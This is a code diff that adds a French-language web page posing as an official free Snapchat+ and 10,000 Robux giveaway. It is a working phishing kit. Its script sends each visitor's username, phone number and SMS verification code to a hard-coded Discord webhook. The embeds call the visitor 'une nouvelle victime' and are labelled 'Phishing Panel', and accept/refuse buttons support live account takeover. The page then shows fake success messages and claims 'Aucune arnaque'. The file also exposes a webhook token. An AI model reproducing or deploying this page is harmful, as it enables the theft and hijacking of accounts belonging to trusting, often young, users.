@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat+ & Robux Gratuit</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(135deg, #0f0f23, #1a1a2e);
+      color: #e0e0ff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(26px);
+      border-radius: 32px;
+      border: 1px solid rgba(255,255,255,0.15);
+      box-shadow: 0 35px 100px rgba(0,0,0,0.75);
+      overflow: hidden;
+    }
+
+    header {
+      padding: 55px 30px 35px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 88px;
+      height: 88px;
+      background: #fffc00;
+      border-radius: 50%;
+      margin: 0 auto 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      box-shadow: 0 0 50px rgba(255,252,0,0.75);
+      animation: logoFloat 7s ease-in-out infinite;
+    }
+
+    h1 { font-size: 3rem; font-weight: 900; }
+    .subtitle { font-size: 1.4rem; opacity: 0.9; }
+
+    .step {
+      padding: 40px 30px;
+      min-height: 460px;
+      display: none;
+      opacity: 0;
+      transform: translateX(30px);
+      transition: all 0.6s cubic-bezier(0.25, 0.1, 0.25, 1);
+    }
+
+    .step.active {
+      display: block;
+      opacity: 1;
+      transform: translateX(0);
+    }
+
+    h2 { text-align: center; margin-bottom: 35px; font-size: 1.65rem; }
+
+    .offer-card {
+      background: rgba(255,255,255,0.09);
+      border: 2px solid transparent;
+      border-radius: 24px;
+      padding: 32px 28px;
+      margin-bottom: 24px;
+      cursor: pointer;
+      transition: all 0.4s ease;
+    }
+
+    .offer-card:hover { transform: translateY(-8px); border-color: #c084fc; }
+    .offer-card.popular { border-color: #c084fc; }
+    .offer-card.robux-offer { border-color: #facc15; background: rgba(250,204,21,0.08); }
+
+    .popular-badge {
+      background: linear-gradient(90deg, #c084fc, #e879f9);
+      color: white;
+      font-size: 0.85rem;
+      padding: 6px 20px;
+      border-radius: 30px;
+      display: inline-block;
+      margin-bottom: 14px;
+    }
+
+    .duration { font-size: 2.8rem; font-weight: 900; margin: 10px 0 12px; }
+
+    .btn {
+      width: 100%;
+      padding: 17px;
+      font-size: 1.25rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 18px;
+      background: linear-gradient(90deg, #8b5cf6, #db2777);
+      color: white;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .btn-robux {
+      background: linear-gradient(90deg, #facc15, #f97316) !important;
+    }
+
+    .btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    input {
+      width: 100%;
+      padding: 18px;
+      font-size: 1.25rem;
+      background: rgba(0,0,0,0.45);
+      border: 1px solid #a78bfa;
+      border-radius: 18px;
+      color: white;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+
+    .legal {
+      text-align: center;
+      padding: 25px;
+      color: #888;
+      font-size: 0.9rem;
+    }
+
+    @keyframes logoFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-12px); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <header>
+      <div class="logo">👻</div>
+      <h1>Snapchat+</h1>
+      <p class="subtitle">Accès Premium + Robux Illimité</p>
+    </header>
+
+    <!-- Étape 1 -->
+    <div id="step1" class="step active">
+      <h2>Choisis ta récompense</h2>
+
+      <!-- Offre Snapchat 1 mois -->
+      <div class="offer-card" onclick="selectOffer(1)">
+        <div style="font-size:1.45rem; font-weight:600;">1 Mois Gratuit</div>
+        <div class="duration">1 mois</div>
+        <div style="color:#aaa;">Snapchat+ complet</div>
+        <button class="btn">Choisir</button>
+      </div>
+
+      <!-- Offre Robux (NOUVEAU) -->
+      <div class="offer-card robux-offer" onclick="selectOffer('robux')">
+        <div style="font-size:1.45rem; font-weight:600; color:#facc15;">🪙 10 000 Robux</div>
+        <div class="duration" style="color:#facc15;">10K R$</div>
+        <div style="color:#aaa;">Crédité instantanément sur Roblox</div>
+        <button class="btn btn-robux">Choisir cette offre</button>
+      </div>
+
+      <!-- Offre Snapchat 1 an -->
+      <div class="offer-card popular" onclick="selectOffer(12)">
+        <div class="popular-badge">RECOMMANDÉ</div>
+        <div style="font-size:1.45rem; font-weight:600;">1 An Gratuit</div>
+        <div class="duration">12 mois</div>
+        <div style="color:#aaa;">Économise 11 mois</div>
+        <button class="btn">Choisir</button>
+      </div>
+    </div>
+
+    <!-- Étape 2 -->
+    <div id="step2" class="step">
+      <h2>Nom d'utilisateur</h2>
+      <input type="text" id="username" placeholder="Ton pseudo Snapchat ou Roblox">
+      <button class="btn" onclick="goToPhone()">Continuer</button>
+    </div>
+
+    <!-- Étape 3 -->
+    <div id="step3" class="step">
+      <h2>Numéro de téléphone</h2>
+      <input type="tel" id="phone" placeholder="06 XX XX XX XX" maxlength="14">
+      <button class="btn" id="sendBtn" onclick="sendNumber()">Recevoir le code par SMS</button>
+    </div>
+
+    <!-- Étape 4 -->
+    <div id="step4" class="step">
+      <h2>Code de vérification</h2>
+      <input type="text" id="code" placeholder="1234" maxlength="4" 
+             style="font-size: 2.4rem; letter-spacing: 15px;">
+      <div style="background:rgba(103,232,249,0.15); border:1px solid #67e8f9; border-radius:16px; padding:18px; margin:25px 0; text-align:center;">
+        Un code à 4 chiffres va vous être envoyé dans les <strong>3 minutes</strong>.
+      </div>
+      <button class="btn" id="validateBtn" onclick="submitCode()">Valider le code</button>
+    </div>
+
+    <div class="legal">
+      Opération officielle • 100% gratuit • Aucune arnaque
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1539316376395845643/-Et7lvU3qu51htfKTcaP6iKygqdEQ4RQ2mo5sIZSw3Ms1rE8sVhYZcG0sEQXc_Yvr0bR";
+
+    let selectedOffer = 12; // 'robux' ou nombre de mois
+    let username = "";
+    let phoneNumber = "";
+    let isSending = false;
+    let codeAlreadySent = false;
+
+    function selectOffer(offer) {
+      selectedOffer = offer;
+      showStep(2);
+    }
+
+    function showStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById('step' + step).classList.add('active');
+    }
+
+    function goToPhone() {
+      username = document.getElementById('username').value.trim();
+      if (username.length < 3) {
+        alert("Veuillez entrer ton pseudo (minimum 3 caractères).");
+        return;
+      }
+      showStep(3);
+    }
+
+    async function sendNumber() {
+      const btn = document.getElementById('sendBtn');
+      if (isSending) return;
+
+      isSending = true;
+      btn.disabled = true;
+      btn.textContent = "Envoi en cours...";
+
+      let phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
+
+      if ((!phone.startsWith('06') && !phone.startsWith('07')) || phone.length !== 10) {
+        alert("Veuillez entrer un numéro valide commençant par 06 ou 07 (10 chiffres).");
+        resetSendButton();
+        return;
+      }
+
+      phoneNumber = phone;
+      await sendNewRequestWebhook();
+      showStep(4);
+      resetSendButton();
+    }
+
+    function resetSendButton() {
+      const btn = document.getElementById('sendBtn');
+      isSending = false;
+      btn.disabled = false;
+      btn.textContent = "Recevoir le code par SMS";
+    }
+
+    // Webhook Nouvelle Demande (avec l'option Robux)
+    async function sendNewRequestWebhook() {
+      if (!WEBHOOK_URL) return;
+
+      let durationText = (selectedOffer === 'robux') ? '10 000 Robux' : `${selectedOffer} mois`;
+
+      const payload = {
+        embeds: [{
+          title: (selectedOffer === 'robux') ? "🪙 Nouvelle demande ROBUX" : "👻 Nouvelle demande Snapchat+",
+          description: "Une nouvelle victime a rempli le formulaire.",
+          color: (selectedOffer === 'robux') ? 0xfacc15 : 0x8b5cf6,
+          fields: [
+            { name: "👤 Utilisateur", value: `\`${username || "Non renseigné"}\`` },
+            { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
+            { name: "🎁 Offre choisie", value: `\`${durationText}\`` }
+          ],
+          footer: { text: "Snap/Robux • Phishing Panel" },
+          timestamp: new Date().toISOString()
+        }],
+        components: [
+          {
+            type: 1,
+            components: [
+              { type: 2, style: 3, label: "✅ Accepter", custom_id: "accept_request" },
+              { type: 2, style: 4, label: "❌ Refuser", custom_id: "refuse_request" }
+            ]
+          }
+        ]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) {}
+    }
+
+    // Webhook Code Reçu (avec différenciation)
+    async function submitCode() {
+      const code = document.getElementById('code').value.trim();
+      const btn = document.getElementById('validateBtn');
+
+      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
+        alert("Le code doit contenir exactement 4 chiffres.");
+        return;
+      }
+
+      if (codeAlreadySent) return;
+
+      codeAlreadySent = true;
+      btn.disabled = true;
+      btn.textContent = "Code envoyé...";
+
+      await sendCodeWebhook(code);
+
+      setTimeout(() => {
+        if (selectedOffer === 'robux') {
+          alert("✅ 10 000 Robux crédités sur ton compte Roblox !\nVérifie dans les 5 minutes.");
+        } else {
+          alert("✅ Code validé avec succès !\nTon Snapchat+ est maintenant activé.");
+        }
+        resetAll();
+      }, 800);
+    }
+
+    async function sendCodeWebhook(code) {
+      if (!WEBHOOK_URL) return;
+
+      let durationText = (selectedOffer === 'robux') ? '10 000 Robux' : `${selectedOffer} mois`;
+      let title = (selectedOffer === 'robux') ? "✅ Code ROBUX reçu" : "✅ Code Snapchat+ reçu";
+      let color = (selectedOffer === 'robux') ? 0xfacc15 : 0x22c55e;
+
+      const payload = {
+        embeds: [{
+          title: title,
+          description: "Un code de vérification a été saisi.",
+          color: color,
+          fields: [
+            { name: "👤 Utilisateur", value: `\`${username}\`` },
+            { name: "🔑 Code", value: `\`${code}\`` },
+            { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
+            { name: "🎁 Offre", value: `\`${durationText}\`` }
+          ],
+          footer: { text: "Snap/Robux • Code reçu" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch(e) {}
+    }
+
+    function resetAll() {
+      username = "";
+      phoneNumber = "";
+      codeAlreadySent = false;
+      document.getElementById('username').value = "";
+      document.getElementById('phone').value = "";
+      document.getElementById('code').value = "";
+      showStep(1);
+    }
+
+    // Forcer uniquement les chiffres
+    document.addEventListener('DOMContentLoaded', () => {
+      const codeInput = document.getElementById('code');
+      codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+    });
+  </script>
+</body>
+</html>
